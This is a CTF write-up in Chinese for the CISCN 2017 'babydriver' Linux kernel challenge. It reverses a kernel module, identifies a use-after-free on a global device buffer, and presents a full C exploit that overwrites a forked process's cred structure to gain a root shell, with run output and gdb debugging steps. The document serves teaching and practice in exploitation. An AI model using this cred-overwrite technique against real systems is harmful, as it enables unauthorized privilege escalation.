# CISCN 2017 babydriver (UAF利用方法)

题目链接: [https://github.com/beafb1b1/challenges/tree/master/kernel/CISCN_2017_babydriver](https://github.com/beafb1b1/challenges/tree/master/kernel/CISCN_2017_babydriver)

## 前置操作

题目给了`boot.sh`,`bzImage`和`rootfs.cpio`三个文件首先观察`boot.sh`，也就是题目启动脚本:
```bash
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep
```
题目使用`rootfs.cpio`作为文件系统，`bzImage`作为内核，使用qemu进行模拟，并且开启了smep。因为没有给ko文件，所以我们首先对rootfs.cpio文件进行解压：
```bash
tar -xf babydriver.tar
mv rootfs.cpio rootfs.cpio.gz
mkdir rootfs & mv rootfs.cpio.gz ./rootfs/
cd rootfs
gunzip ./rootfs.cpio.gz
cpio -idmv < rootfs.cpio
```
然后我们可以看到如下目录：
```
➜  rootfs ls
bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
```
分析下init文件：
```bash
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```
flag权限设置为了400，也就是只有root才能读到flag。并在执行了`insmod /lib/modules/4.4.72/babydriver.ko`，我们在对应目录找到ko文件，那么这就是需要进行漏洞挖掘和利用的LKM了。接下来我们对该文件进行分析。

## LKM逆向

首先进行`checksec`：

```
➜  rootfs checksec ./lib/modules/4.4.72/babydriver.ko 
[*] '/home/b/Desktop/rootfs/lib/modules/4.4.72/babydriver.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

PIE、canary等都没开，并且保留了符号。接下来我们使用IDA进行分析，因为有符号信息，所以首先我们去找结构体，使用`shift + F9`可以看到：

```cpp
......
00000000 ; [00000001 BYTES. COLLAPSED STRUCT lock_class_key. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000010 BYTES. COLLAPSED STRUCT babydevice_t. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000068 BYTES. COLLAPSED STRUCT cdev. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000040 BYTES. COLLAPSED STRUCT kobject. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000010 BYTES. COLLAPSED STRUCT list_head. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000004 BYTES. COLLAPSED STRUCT kref. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000004 BYTES. COLLAPSED STRUCT atomic_t. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [000000D8 BYTES. COLLAPSED STRUCT file_operations. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000040 BYTES. COLLAPSED STRUCT modversion_info. PRESS CTRL-NUMPAD+ TO EXPAND]
......
```

这里有几个结构体是需要分析的，首先是`file_operations`，展开后是如下内容：

```cpp
00000000 file_operations struc ; (sizeof=0xD8, align=0x8, copyof_138)
00000000                                         ; XREF: .data:fops/r
00000000 owner           dq ?                    ; offset
00000008 llseek          dq ?                    ; offset
00000010 read            dq ?                    ; offset
00000018 write           dq ?                    ; offset
00000020 read_iter       dq ?                    ; offset
00000028 write_iter      dq ?                    ; offset
00000030 iterate         dq ?                    ; offset
00000038 poll            dq ?                    ; offset
00000040 unlocked_ioctl  dq ?                    ; offset
00000048 compat_ioctl    dq ?                    ; offset
00000050 mmap            dq ?                    ; offset
00000058 open            dq ?                    ; offset
00000060 flush           dq ?                    ; offset
00000068 release         dq ?                    ; offset
00000070 fsync           dq ?                    ; offset
00000078 aio_fsync       dq ?                    ; offset
00000080 fasync          dq ?                    ; offset
00000088 lock            dq ?                    ; offset
00000090 sendpage        dq ?                    ; offset
00000098 get_unmapped_area dq ?                  ; offset
000000A0 check_flags     dq ?                    ; offset
000000A8 flock           dq ?                    ; offset
000000B0 splice_write    dq ?                    ; offset
000000B8 splice_read     dq ?                    ; offset
000000C0 setlease        dq ?                    ; offset
000000C8 fallocate       dq ?                    ; offset
000000D0 show_fdinfo     dq ?                    ; offset
000000D8 file_operations ends
```

这个结构体里会记录对设备的文件操作被重定向到了什么函数，这里可以xref一下，可以看到init函数babydriver_init()中的一个函数，内容为：

```
cdev_init(&cdev_0, &fops);
```

其中&fops是一个file_operations结构体的实例，内容如下：

```cpp=
.data:00000000000008C0 ; file_operations fops
.data:00000000000008C0 fops            file_operations <offset __this_module, 0, offset babyread, \
.data:00000000000008C0                                         ; DATA XREF: babydriver_init:loc_1AA↑o
.data:00000000000008C0                                  offset babywrite, 0, 0, 0, 0, offset babyioctl, 0, 0,\
.data:00000000000008C0                                  offset babyopen, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
.data:00000000000008C0                                  0, 0, 0>
.data:00000000000008C0 _data           ends
```

通过对比可以知道对设备文件的操作会通过如下函数进行处理（注意这里IDA显示的有些问题，release其实对应的是babyrelease）：
* open: babyopen
* read: babyread
* write: babywrite
* ioctl: babyioctl
* release: babyrelease

第二个需要注意的结构体是babydevice_t

```cpp
00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
00000000                                         ; XREF: .bss:babydev_struct/r
00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
00000000                                         ; babyopen+26/w ... ; offset
00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
00000008                                         ; babyioctl+3C/w ...
00000010 babydevice_t    ends
```

该结构体一共`0x10`个字节，其中前8个字节是`device_buf`，后2个字节是`bevice_buf_len`。接下来我们对程序中的函数进行分析。

### babyopen

在设备文件打开时会执行babyopen函数，babyopen函数如下：
```cpp
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 37748928LL, v2);
  return 0;
}
```
每次open的时候都会通过kmalloc申请一块64字节大小的内存，并把指针存储在bss上的全局变量babydev_struct中，同时更新babydev_struct的device_buf_len为64。

### babyread

在对打开的设备进行read操作时会执行babyread函数，babyread函数如下：
```CPP
ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);
    result = v6;
  }
  return result;
}
```
该函数首先检查了`babydev_struct`的`device_buf_len`是否比要读的长度大，满足条件的话，就把`babydev_struct.device_buf`指向的数据拷贝到buffer 中，buffer和长度都是用户传递的参数，其中buffer是用户态的地址。

### babywrite

在对设备文件进行write操作时，会执行babywrite函数，函数内容如下：
```CPP
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user(babydev_struct.device_buf, (void *)buffer, (void *)v4);
    result = v6;
  }
  return result;
}
```
首先检查传入的长度是否满足小于`device_buf_len`,然后将用户态buffer中的内容拷贝到`babydev_struct.device_buf`指向的空间。

### babyioctl

```
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx
  __int64 result; // rax

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 37748928LL, v5);
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB, v3, v3);
    result = -22LL;
  }
  return result;
}
```
定义了 0x10001 的命令，用户态可以通过ioctl进行交互，该函数首先释放了`babydev_struct.device_buf`指向的内存，再根据用户传递的参数重新申请了一块内存，并把长度赋值给`babydev_struct.device_buf_len`。

### babyrelease
```CPP
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v2);
  return 0;
}
```
关闭设备文件的时候会释放`babydev_struct.device_buf`。

## 漏洞利用

这里存在一个UAF漏洞，babydev_struct是全局变量，如果我们open设备两次，那么第二次open的时候就会覆盖第一次open的babydev_struct，此时free掉第一个，第二个指向的就是free后的，因此这里存在一个UAF。

这里考虑的一种简单的利用方法利用UAF去修改新进程的CRED结构，从而打成权限提升的效果。首先我们看一下该内核版本的CRED结构：
```CPP
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
};
```
大小为0xa8，那么利用思路就很明确了：
1. 首先打开babydev两次，此时第二次申请的内存会覆盖第一次申请的内存地址；
2. 通过ioctl修改内存大小为0xa8，也就是cred的大小；
3. 关闭第一个句柄，此时会执行babyrelease函数，全局变量中的结构体指向的0xa8大小的内存会被释放，而第二个文件句柄依然存在，因此我们获得了一个悬垂指针（指向被释放的内存）；
4. 这时fork一个新的进程，新进程的cred正好申请在我们释放的位置；
5. 通过悬垂指针我们可以write新进程cred中的内容，从而实现新进程的权限提升。

下面编写UAF的利用程序：
```CPP
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
    // 打开两次设备
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
    ioctl(fd1, 0x10001, 0xa8);

    // 释放 fd1
    close(fd1);

    // 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
    int pid = fork();
    if(pid < 0)
    {
        puts("[*] fork error!");
        exit(0);
    }

    else if(pid == 0)
    {
        // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
        char zeros[30] = {0};
        write(fd2, zeros, 28);

        if(getuid() == 0)
        {
            puts("[+] root now.");
            system("/bin/sh");
            exit(0);
        }
    }

    else
    {
        wait(NULL);
    }
    close(fd2);

    return 0;
}
```

我们对exp进行编译，因为这个题目的kernel里面没有libc，所以这里我们静态编译exp:
```bash
➜  Desktop gcc exp.c -static -o exploit
➜  Desktop file exploit 
exploit: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=b4df5ea181b300281f32a5e9a974ccd2f24f2ee3, not stripped
```
因为我们是本地调试，所以可以将exp直接放入到rootfs目录中并重新打包：
```bash
➜  Desktop cp exploit ./rootfs/home/ctf/        
➜  Desktop cd rootfs 
➜  rootfs find . | cpio -o --format=newc > ../rootfs.cpio
7216 blocks
```
接下来直接运行并执行exp就可以拿到root权限：
```bash
/ $ cd /home/ctf
~ $ ls
exploit
~ $ ./exploit 
[   22.269245] device open
[   22.270112] device open
[   22.271025] alloc done
[   22.271863] device release
[+] root now.
/home/ctf # id
uid=0(root) gid=0(root) groups=1000(ctf)
```

## 如何调试

我们调试一下，从内核的bzImage文件中我们可以通过如下脚本提取出内核符号文件vmlinux:
```bash
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux
```
使用方法如下：
```bash
➜  Desktop /usr/src/linux-headers-4.15.0-54/scripts/extract-vmlinux bzImage > vmlinux
➜  Desktop file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped
```

接下来修改一下启动脚本，首先需要在启动命令后添加`-gdb tcp::1234 -S`。
```bash
#!/bin/bash
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234 -S
```

然后运行启动脚本，这时虚拟机会停等待gdb连接。使用`gdb ./vmlinux`启动gdb，并远程连接到qemu，执行c，让虚拟机继续运行:
```bash
gdb ./vmlinux
...
pwndbg> target remote localhost:1234
pwndbg> c
```

虚拟机运行后我们可以通过如下方式来看ko文件.text段的地址：
```bash
/ $ cat /sys/module/babydriver/sections/.text 
0xffffffffc0000000
```

接下来加入ko文件的符号表，在gdb中运行`add-symbol-file core.ko textaddr`即可：
```bash
pwndbg> add-symbol-file babydriver.ko 0xffffffffc0000000
add symbol table from file "babydriver.ko" at
	.text_addr = 0xffffffffc0000000
Reading symbols from babydriver.ko...done.
```

然后就可以调试了，此时我们可以直接b函数名（因为ko文件里面带有符号表）：
```
pwndbg> b babyopen
Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 28.
pwndbg> c
Continuing.
```

此时我们再运行exp们就会成功断到babyopen。如果没有符号信息的话，就只能计算地址直接b。